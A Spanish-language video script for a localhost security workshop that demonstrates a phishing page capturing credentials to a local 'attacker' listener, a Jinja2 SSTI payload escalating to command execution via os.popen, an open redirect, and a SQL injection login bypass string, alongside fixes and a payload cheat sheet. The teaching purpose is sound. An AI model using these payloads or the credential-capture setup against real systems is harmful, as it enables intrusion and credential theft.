# Guión del video — Taller de phishing y explotación de vulnerabilidades

Demostración **100% local** (`127.0.0.1`), marca ficticia, fines académicos.
Duración objetivo: **6–9 min**. Todo lo que tecleas aquí lo recibe **tu propio** servidor.

---

## 0. Preparación (antes de grabar)

Abre **3 terminales** en la carpeta `taller-phishing-demo` (con el venv activado) y
**2 ventanas de navegador**. Deja todo listo y visible:

| Ventana | Qué corre | Comando |
|---|---|---|
| Terminal 1 — **"Atacante"** | Listener que roba credenciales | `python listener.py` |
| Terminal 2 — **App** | La web vulnerable (Flask) | `python init_db.py` y luego `python app.py` |
| Terminal 3 — **Ataques** | Desde aquí lanzas los payloads | (libre) |
| Navegador A | La **página de phishing** | abre `index.html` (doble clic o Live Server) |
| Navegador B | La **app del lab** | `http://127.0.0.1:5000` |

> Encuadre recomendado: **Terminal 1 (Atacante) siempre visible** a un lado, porque ahí
> aparecerán las credenciales robadas y el objetivo es que el espectador lo vea en vivo.

Frase de apertura (cámara/intro):
> «Esto es un laboratorio **local y controlado**, con una marca inventada. Nada sale de mi
> equipo. Voy a mostrar dos cosas: primero, cómo una página falsa **roba** lo que escribo;
> después, cómo **exploto** dos vulnerabilidades reales y cómo se **corrigen**.»

---

## 1. El phishing roba tus credenciales (≈2 min)

**Objetivo:** mostrar que al "iniciar sesión" en la página falsa, lo tecleado viaja a la
consola del atacante.

1. **Muestra la página falsa** (Navegador A, `index.html`). Narra las señales:
   > «Se ve como un sitio normal: logo, buscador, login. Pero fíjense en la URL falsa de
   > arriba, el candado "No seguro" y el mensaje de urgencia de 24 horas. Son señuelos.»

2. **Pon a la vista la Terminal 1 (Atacante).** Narra:
   > «Aquí está el servidor del atacante, esperando. Ahora voy a escribir mis datos como si
   > fuera una víctima.»

3. **Escribe en el formulario** un correo y una clave de ejemplo (nunca reales):
   - Correo: `victima@correo.cl`
   - Clave: `MiClaveSuperSecreta123`

4. **Pulsa INICIAR SESIÓN.** Dos cosas ocurren a la vez:
   - Aparece el overlay «**Acabas de caer en la simulación**».
   - En la **Terminal 1** aparece, en vivo:
     ```
     ============================================================
     [hh:mm:ss]  >>> CREDENCIALES CAPTURADAS POR EL SITIO FALSO <<<
            correo : victima@correo.cl
            clave  : MiClaveSuperSecreta123
            desde  : 127.0.0.1
     ============================================================
     ```

5. **Señala la terminal** y cierra la idea:
   > «La página no validó nada: simplemente **envió** lo que escribí a un servidor que yo
   > controlo. En un ataque real, esas credenciales ya estarían robadas. Por eso jamás se
   > escribe la clave tras un enlace de correo.»

> Nota técnica (por si preguntan): el envío lo hace `index.html` con un `fetch` a
> `http://127.0.0.1:9999/captura`; el listener imprime lo recibido. Todo en localhost.

---

## 2. VULN 1 — SSTI (Server-Side Template Injection) (≈2–3 min)

**OWASP A03:2021 Injection.** Ruta vulnerable: `/saludo?nombre=...` en la **app** (Navegador B).

### 2a. Comportamiento normal
En el navegador:
```
http://127.0.0.1:5000/saludo?nombre=Ignacia
```
> «La página me saluda: *Hola, Ignacia*. Toma mi texto y lo pone en la respuesta.»

### 2b. Detección — ¿el servidor evalúa lo que escribo?
```
http://127.0.0.1:5000/saludo?nombre={{7*7}}
```
> «Si fuera texto normal, mostraría *Hola, {{7*7}}!*. Pero muestra **Hola, 49!**. El servidor
> **calculó** mi entrada: eso es inyección de plantilla del lado servidor, SSTI.»

Confirmación del motor (opcional, refuerza que es Jinja2/Python):
```
http://127.0.0.1:5000/saludo?nombre={{7*'7'}}
```
> «Responde `7777777`: multiplicar texto por un número es comportamiento de Python, así que
> por detrás corre Jinja2 sobre Python.»

### 2c. Explotación — escalada a ejecución de comandos (RCE)
Narra antes de pegarlo:
> «Si puedo evaluar expresiones, puedo llegar hasta el sistema operativo. Este payload sale
> del contexto de la plantilla hasta `os.popen` y ejecuta un comando en el servidor.»

Pega en el navegador (payload exacto):
```
http://127.0.0.1:5000/saludo?nombre={{ cycler.__init__.__globals__.os.popen('whoami').read() }}
```
> «Me devuelve el **usuario del sistema** del servidor. No es un cálculo: es un **comando
> ejecutándose** en la máquina. Cambiando `whoami` por otro comando, se ejecuta igual.»

Equivalente desde la Terminal 3 (útil para mostrar el texto crudo):
```bash
curl -s "http://127.0.0.1:5000/saludo" --get \
  --data-urlencode "nombre={{ cycler.__init__.__globals__.os.popen('whoami').read() }}"
```

### 2d. La corrección (muéstrala)
> «Se arregla no construyendo la plantilla con la entrada del usuario. El dato se pasa como
> **variable** a una plantilla fija; así `{{7*7}}` se mostraría literal, sin evaluarse.»
```python
# CORRECTO: 'nombre' es un dato, no parte de la plantilla.
return render_template_string("<h2>Hola, {{ nombre }}!</h2>", nombre=nombre)
```

---

## 3. VULN 2 — Open Redirect (≈1–2 min)

**OWASP A01:2021 Broken Access Control / CWE-601.** Ruta: `/go?url=...` en la **app**.

### 3a. Uso legítimo
```
http://127.0.0.1:5000/go?url=/
```
> «El endpoint sirve para redirigir; con una ruta interna, me devuelve al inicio.»

### 3b. Explotación — redirige a un destino ajeno
Asegúrate de que la **Terminal 1 (listener)** sigue viva: su `GET /test` es el aterrizaje.
En el navegador:
```
http://127.0.0.1:5000/go?url=http://127.0.0.1:9999/test
```
> «El enlace **empieza con el dominio de confianza de la app**, pero termina llevándome a
> **otro servidor** (el del atacante, puerto 9999). La app me "soltó" fuera sin validar.»

Para mostrar la cabecera `302` (Terminal 3):
```bash
curl -s -i "http://127.0.0.1:5000/go?url=http://127.0.0.1:9999/test" | findstr /I "HTTP Location"
```
```
HTTP/1.1 302 FOUND
Location: http://127.0.0.1:9999/test
```

### 3c. Por qué es peligroso + corrección
> «Esto se abusa en **phishing**: el enlace parece del sitio legítimo y **hereda su confianza**
> (pasa filtros, se ve creíble), pero salta a una página fraudulenta. Se corrige permitiendo
> **solo rutas internas** o una **lista blanca** de destinos.»
```python
from urllib.parse import urlparse
def destino_seguro(url):
    p = urlparse(url)
    return (not p.scheme) and (not p.netloc) and url.startswith('/') and not url.startswith('//')
return redirect(destino if destino_seguro(destino) else '/')
```

---

## 4. Cierre — las defensas que SÍ están bien (≈1 min, opcional)

Rápido, para contrastar. Desde la Terminal 3:

```bash
# Bypass de login con inyección SQL -> FALLA (401), por consultas parametrizadas
curl -s -o nul -w "SQLi login -> HTTP %{http_code}\n" --data "email=admin@comparaya.cl' OR '1'='1' -- &password=x" http://127.0.0.1:5000/login

# Panel admin sin sesión -> 403 (control de acceso por rol)
curl -s -o nul -w "/panel sin sesion -> HTTP %{http_code}\n" http://127.0.0.1:5000/panel

# Cabeceras de seguridad presentes
curl -s -i http://127.0.0.1:5000/ | findstr /I "Content-Security-Policy X-Frame-Options X-Content-Type-Options"
```

Frase de cierre:
> «Resumen: una página falsa puede **robar** lo que escribes, y una app mal hecha puede tener
> fallos como **SSTI** (hasta ejecutar comandos) u **Open Redirect** (abusado en phishing).
> Las defensas: no confiar en la entrada del usuario, parametrizar, validar destinos,
> controlar accesos y endurecer cabeceras. Y como usuarios: escribir nosotros la dirección,
> usar 2FA y desconfiar de la urgencia.»

---

## Chuleta de payloads (copiar/pegar)

```
# Phishing: credenciales de ejemplo
victima@correo.cl  /  MiClaveSuperSecreta123

# SSTI — detección
http://127.0.0.1:5000/saludo?nombre={{7*7}}
http://127.0.0.1:5000/saludo?nombre={{7*'7'}}

# SSTI — RCE
http://127.0.0.1:5000/saludo?nombre={{ cycler.__init__.__globals__.os.popen('whoami').read() }}

# Open Redirect
http://127.0.0.1:5000/go?url=http://127.0.0.1:9999/test
```
